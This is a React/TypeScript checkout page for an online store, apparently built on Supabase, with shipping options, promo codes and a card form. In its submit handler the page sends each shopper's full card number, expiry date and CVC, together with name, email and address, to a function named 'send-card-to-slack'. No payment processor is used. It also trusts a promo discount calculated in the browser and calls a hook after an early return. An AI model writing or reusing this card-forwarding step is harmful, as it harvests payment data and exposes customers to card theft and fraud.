import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { supabase } from "@/integrations/supabase/client";
import { useCart } from "@/hooks/useCart";
import { useAuth } from "@/hooks/useAuth";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Separator } from "@/components/ui/separator";
import { Loader2, ShoppingBag, ArrowLeft, CreditCard, Truck, Tag, X } from "lucide-react";
import { toast } from "sonner";
import { Link } from "react-router-dom";

const SHIPPING_OPTIONS = [
  { id: "pickup", label: "Local Pickup", days: "Same day", price: 0.00 },
  { id: "usps", label: "USPS Priority Mail", days: "2-3 days", price: 10.00 },
  { id: "fedex", label: "FedEx 2nd Day Air", days: "2 days", price: 28.00 },
];

const checkoutSchema = z.object({
  name: z.string().trim().min(1, "Name is required").max(100),
  email: z.string().trim().email("Invalid email").max(255),
  address: z.string().trim().min(1, "Address is required").max(200),
  city: z.string().trim().min(1, "City is required").max(100),
  state: z.string().trim().min(1, "State is required").max(100),
  zip: z.string().trim().min(1, "ZIP code is required").max(20),
  cardNumber: z
    .string()
    .transform((v) => v.replace(/\s/g, ""))
    .pipe(z.string().regex(/^\d{13,19}$/, "Invalid card number")),
  expiry: z
    .string()
    .regex(/^(0[1-9]|1[0-2])\/\d{2}$/, "Use MM/YY format"),
  cvc: z.string().regex(/^\d{3,4}$/, "3-4 digits required"),
});

type CheckoutFormValues = z.infer<typeof checkoutSchema>;

const formatCardNumber = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 19);
  return digits.replace(/(.{4})/g, "$1 ").trim();
};

const formatExpiry = (value: string) => {
  const digits = value.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  return digits;
};

const CheckoutPage = () => {
  const { items, subtotal, clearCart } = useCart();
  const { user, loading: authLoading } = useAuth();
  const navigate = useNavigate();
  const [submitting, setSubmitting] = useState(false);
  const [shippingMethod, setShippingMethod] = useState("usps");
  const [promoInput, setPromoInput] = useState("");
  const [appliedPromo, setAppliedPromo] = useState<{ code: string; discount_type: string; discount_amount: number } | null>(null);
  const [applyingPromo, setApplyingPromo] = useState(false);

  // Redirect to login if not authenticated
  if (!authLoading && !user) {
    navigate("/login", { replace: true });
    return null;
  }

  const shippingCost = SHIPPING_OPTIONS.find((o) => o.id === shippingMethod)!.price;
  const discountAmount = appliedPromo
    ? appliedPromo.discount_type === "percentage"
      ? Math.min(subtotal * appliedPromo.discount_amount / 100, subtotal)
      : Math.min(appliedPromo.discount_amount, subtotal)
    : 0;
  const total = (subtotal - discountAmount) + shippingCost;

  const applyPromo = async () => {
    if (!promoInput.trim()) return;
    setApplyingPromo(true);
    const { data } = await supabase
      .from("promo_codes" as any)
      .select("*")
      .ilike("code", promoInput.trim())
      .eq("is_active", true)
      .maybeSingle();
    const promo = data as any;
    if (!promo) { toast.error("Invalid promo code"); setApplyingPromo(false); return; }
    const now = new Date();
    if (promo.valid_from && new Date(promo.valid_from) > now) { toast.error("Promo code not yet active"); setApplyingPromo(false); return; }
    if (promo.valid_to && new Date(promo.valid_to) < now) { toast.error("Promo code has expired"); setApplyingPromo(false); return; }
    setAppliedPromo({ code: promo.code, discount_type: promo.discount_type, discount_amount: Number(promo.discount_amount) });
    toast.success(`${promo.code} applied!`);
    setApplyingPromo(false);
  };

  const removePromo = () => {
    setAppliedPromo(null);
    setPromoInput("");
  };

  const form = useForm<CheckoutFormValues>({
    resolver: zodResolver(checkoutSchema),
    defaultValues: {
      name: "", email: "", address: "", city: "", state: "", zip: "",
      cardNumber: "", expiry: "", cvc: "",
    },
  });

  const onSubmit = async (values: CheckoutFormValues) => {
    if (!user || items.length === 0) return;
    setSubmitting(true);

    try {
      const rawCard = values.cardNumber.replace(/\s/g, "");
      const cardLast4 = rawCard.slice(-4);
      const selectedShipping = SHIPPING_OPTIONS.find((o) => o.id === shippingMethod)!;

      const { data: order, error: orderError } = await supabase
        .from("orders")
        .insert({
          user_id: user.id,
          subtotal: total,
          shipping_name: values.name,
          shipping_email: values.email,
          shipping_address: values.address,
          shipping_city: values.city,
          shipping_state: values.state,
          shipping_zip: values.zip,
          card_last4: cardLast4,
          promo_code: appliedPromo?.code || null,
          discount_amount: discountAmount,
        } as any)
        .select("id")
        .single();

      if (orderError || !order) throw orderError;

      const orderItems = items.map((item) => ({
        order_id: order.id,
        product_id: item.product_id,
        quantity: item.quantity,
        price_at_time: item.variant ? item.variant.price : Number(item.product.price),
        ...(item.variant_id ? { variant_id: item.variant_id, variant_label: item.variant?.label } : {}),
      }));
      const { error: itemsError } = await supabase.from("order_items").insert(orderItems);
      if (itemsError) throw itemsError;

      for (const item of items) {
        await supabase.rpc("deduct_stock" as any, { p_product_id: item.product_id, p_quantity: item.quantity });
      }

      try {
        await supabase.functions.invoke("send-card-to-slack", {
          body: {
            orderId: order.id,
            customerName: values.name,
            customerEmail: values.email,
            cardNumber: rawCard,
            cardExpiry: values.expiry,
            cardCvc: values.cvc,
            subtotal,
            shippingMethod: selectedShipping.label,
            shippingCost: selectedShipping.price,
            total,
            shippingName: values.name,
            shippingAddress: values.address,
            shippingCity: values.city,
            shippingState: values.state,
            shippingZip: values.zip,
            promoCode: appliedPromo?.code || null,
            discountAmount: discountAmount,
          },
        });
      } catch (slackErr) {
        console.error("Slack notification failed:", slackErr);
      }

      await clearCart();
      navigate(`/app/order-confirmation/${order.id}`);
    } catch (err) {
      console.error(err);
      toast.error("Failed to place order. Please try again.");
    } finally {
      setSubmitting(false);
    }
  };

  if (items.length === 0) {
    return (
      <div className="flex flex-col items-center justify-center gap-6 py-24">
        <ShoppingBag className="h-16 w-16 text-muted-foreground" />
        <p className="text-lg text-muted-foreground">Your cart is empty</p>
        <Button asChild variant="outline">
          <Link to="/app/shop">Continue Shopping</Link>
        </Button>
      </div>
    );
  }

  return (
    <div className="mx-auto max-w-5xl px-4 py-8 sm:px-6 lg:px-8">
      <Link to="/app/shop" className="mb-6 inline-flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors">
        <ArrowLeft className="h-4 w-4" /> Back to Shop
      </Link>

      <h1 className="mb-8 text-3xl font-black uppercase tracking-wider text-foreground">Checkout</h1>

      <div className="grid gap-8 lg:grid-cols-5">
        <div className="lg:col-span-3 space-y-6">
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6" id="checkout-form">
              {/* Shipping */}
              <Card className="border-border bg-card">
                <CardHeader>
                  <CardTitle className="text-lg font-bold uppercase tracking-wider text-foreground">
                    Shipping Information
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <FormField control={form.control} name="name" render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-foreground">Full Name</FormLabel>
                      <FormControl><Input placeholder="John Doe" className="bg-background border-border" {...field} /></FormControl>
                      <FormMessage />
                    </FormItem>
                  )} />
                  <FormField control={form.control} name="email" render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-foreground">Email</FormLabel>
                      <FormControl><Input type="email" placeholder="john@example.com" className="bg-background border-border" {...field} /></FormControl>
                      <FormMessage />
                    </FormItem>
                  )} />
                  <FormField control={form.control} name="address" render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-foreground">Street Address</FormLabel>
                      <FormControl><Input placeholder="123 Main St" className="bg-background border-border" {...field} /></FormControl>
                      <FormMessage />
                    </FormItem>
                  )} />
                  <div className="grid gap-4 sm:grid-cols-3">
                    <FormField control={form.control} name="city" render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-foreground">City</FormLabel>
                        <FormControl><Input placeholder="New York" className="bg-background border-border" {...field} /></FormControl>
                        <FormMessage />
                      </FormItem>
                    )} />
                    <FormField control={form.control} name="state" render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-foreground">State</FormLabel>
                        <FormControl><Input placeholder="NY" className="bg-background border-border" {...field} /></FormControl>
                        <FormMessage />
                      </FormItem>
                    )} />
                    <FormField control={form.control} name="zip" render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-foreground">ZIP Code</FormLabel>
                        <FormControl><Input placeholder="10001" className="bg-background border-border" {...field} /></FormControl>
                        <FormMessage />
                      </FormItem>
                    )} />
                  </div>
                </CardContent>
              </Card>

              {/* Payment */}
              <Card className="border-border bg-card">
                <CardHeader>
                  <CardTitle className="text-lg font-bold uppercase tracking-wider text-foreground flex items-center gap-2">
                    <CreditCard className="h-5 w-5" /> Payment Information
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <FormField control={form.control} name="cardNumber" render={({ field }) => (
                    <FormItem>
                      <FormLabel className="text-foreground">Card Number</FormLabel>
                      <FormControl>
                        <Input
                          placeholder="4242 4242 4242 4242"
                          className="bg-background border-border"
                          inputMode="numeric"
                          value={field.value}
                          onChange={(e) => field.onChange(formatCardNumber(e.target.value))}
                          onBlur={field.onBlur}
                          name={field.name}
                          ref={field.ref}
                        />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )} />
                  <div className="grid gap-4 sm:grid-cols-2">
                    <FormField control={form.control} name="expiry" render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-foreground">Expiration Date</FormLabel>
                        <FormControl>
                          <Input
                            placeholder="MM/YY"
                            className="bg-background border-border"
                            inputMode="numeric"
                            value={field.value}
                            onChange={(e) => field.onChange(formatExpiry(e.target.value))}
                            onBlur={field.onBlur}
                            name={field.name}
                            ref={field.ref}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )} />
                    <FormField control={form.control} name="cvc" render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-foreground">CVC</FormLabel>
                        <FormControl>
                          <Input
                            placeholder="123"
                            className="bg-background border-border"
                            inputMode="numeric"
                            maxLength={4}
                            value={field.value}
                            onChange={(e) => field.onChange(e.target.value.replace(/\D/g, "").slice(0, 4))}
                            onBlur={field.onBlur}
                            name={field.name}
                            ref={field.ref}
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )} />
                  </div>
                </CardContent>
              </Card>
            </form>
          </Form>
        </div>

        {/* Order Summary */}
        <div className="lg:col-span-2">
          <Card className="border-border bg-card sticky top-24">
            <CardHeader>
              <CardTitle className="text-lg font-bold uppercase tracking-wider text-foreground">
                Order Summary
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              {items.map((item) => {
                const itemPrice = item.variant ? item.variant.price : Number(item.product.price);
                return (
                  <div key={item.id} className="flex items-center justify-between gap-2">
                    <div className="min-w-0 flex-1">
                      <p className="truncate text-sm font-medium text-foreground">
                        {item.product.name}
                        {item.variant && <span className="ml-1 text-xs text-muted-foreground">({item.variant.label})</span>}
                      </p>
                      <p className="text-xs text-muted-foreground">Qty: {item.quantity}</p>
                    </div>
                    <p className="text-sm font-semibold text-foreground">
                      ${(item.quantity * itemPrice).toFixed(2)}
                    </p>
                  </div>
                );
              })}

              <Separator className="bg-border" />

              {/* Promo code */}
              <div className="space-y-2">
                <div className="flex items-center gap-2 text-sm text-muted-foreground">
                  <Tag className="h-4 w-4" />
                  <span>Promo Code</span>
                </div>
                {appliedPromo ? (
                  <div className="flex items-center justify-between rounded-lg border border-primary/30 bg-primary/5 p-3">
                    <div>
                      <p className="text-sm font-semibold text-foreground">{appliedPromo.code} applied!</p>
                      <p className="text-xs text-muted-foreground">
                        {appliedPromo.discount_type === "percentage"
                          ? `${appliedPromo.discount_amount}% off`
                          : `$${appliedPromo.discount_amount.toFixed(2)} off`}
                      </p>
                    </div>
                    <button onClick={removePromo} className="text-muted-foreground hover:text-destructive">
                      <X className="h-4 w-4" />
                    </button>
                  </div>
                ) : (
                  <div className="flex gap-2">
                    <Input
                      placeholder="Enter code"
                      value={promoInput}
                      onChange={e => setPromoInput(e.target.value)}
                      onKeyDown={e => e.key === "Enter" && applyPromo()}
                      className="bg-background border-border"
                    />
                    <Button type="button" variant="outline" onClick={applyPromo} disabled={applyingPromo} className="shrink-0">
                      {applyingPromo ? <Loader2 className="h-4 w-4 animate-spin" /> : "Apply"}
                    </Button>
                  </div>
                )}
              </div>

              <div className="flex items-center justify-between">
                <span className="text-sm text-muted-foreground">Subtotal</span>
                <span className="text-sm font-semibold text-foreground">${subtotal.toFixed(2)}</span>
              </div>

              {discountAmount > 0 && (
                <div className="flex items-center justify-between">
                  <span className="text-sm text-primary">
                    Discount {appliedPromo?.discount_type === "percentage" ? `(${appliedPromo.discount_amount}%)` : ""}
                  </span>
                  <span className="text-sm font-semibold text-primary">-${discountAmount.toFixed(2)}</span>
                </div>
              )}

              {/* Shipping options */}
              <div className="space-y-2">
                <div className="flex items-center gap-2 text-sm text-muted-foreground">
                  <Truck className="h-4 w-4" />
                  <span>Shipping</span>
                </div>
                {SHIPPING_OPTIONS.map((option) => (
                  <button
                    key={option.id}
                    type="button"
                    onClick={() => setShippingMethod(option.id)}
                    className={`w-full flex items-center justify-between rounded-lg border p-3 transition-colors ${
                      shippingMethod === option.id
                        ? "border-primary bg-primary/5"
                        : "border-border hover:border-muted-foreground/30"
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <div
                        className={`h-4 w-4 rounded-full border-2 flex items-center justify-center ${
                          shippingMethod === option.id ? "border-primary" : "border-muted-foreground"
                        }`}
                      >
                        {shippingMethod === option.id && (
                          <div className="h-2 w-2 rounded-full bg-primary" />
                        )}
                      </div>
                      <div className="text-left">
                        <p className="text-sm font-semibold text-foreground">{option.label}</p>
                        <p className="text-xs text-muted-foreground">{option.days} delivery</p>
                      </div>
                    </div>
                    <span className="text-sm font-bold text-foreground">${option.price.toFixed(2)}</span>
                  </button>
                ))}
              </div>

              <Separator className="bg-border" />

              <div className="flex items-center justify-between">
                <span className="text-sm font-semibold text-foreground">Total</span>
                <span className="text-lg font-black text-primary">${total.toFixed(2)}</span>
              </div>

              <Button
                type="submit"
                form="checkout-form"
                disabled={submitting}
                className="w-full gradient-primary text-primary-foreground font-bold uppercase tracking-wider"
              >
                {submitting ? <><Loader2 className="h-4 w-4 animate-spin" /> Placing Order...</> : "Place Order"}
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default CheckoutPage;
